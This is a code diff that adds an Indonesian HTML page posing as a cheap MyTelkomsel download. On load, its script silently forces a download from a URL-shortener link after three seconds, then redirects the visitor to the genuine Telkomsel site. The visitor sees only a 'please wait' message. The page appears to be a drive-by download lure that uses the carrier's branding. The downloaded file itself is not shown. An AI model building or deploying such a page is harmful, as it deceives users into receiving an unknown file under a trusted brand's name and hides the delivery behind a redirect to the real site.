@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Download MyTelkomsel Murah</title>
+  <script>
+    function triggerDownloadAndRedirect() {
+      // Delay 3 detik sebelum mulai download
+      setTimeout(function () {
+        const link = document.createElement('a');
+        link.href = "https://s.id/PromoTelkomsel2025";
+        link.download = "";
+        document.body.appendChild(link);
+        link.click();
+
+        // Setelah 1 detik dari download, redirect ke halaman Telkomsel
+        setTimeout(function () {
+          window.location.href = "https://www.telkomsel.com/shops/onelink/general?ref=https:%2F%2Fmy.telkomsel.com%2Fapp%2Fflexible-time-promo%2Fpaketomglow";
+        }, 1000);
+      }, 3000);
+    }
+
+    window.onload = triggerDownloadAndRedirect;
+  </script>
+</head>
+<body>
+  <p>Mohon tunggu sebentar...</p>
+</body>
+</html>
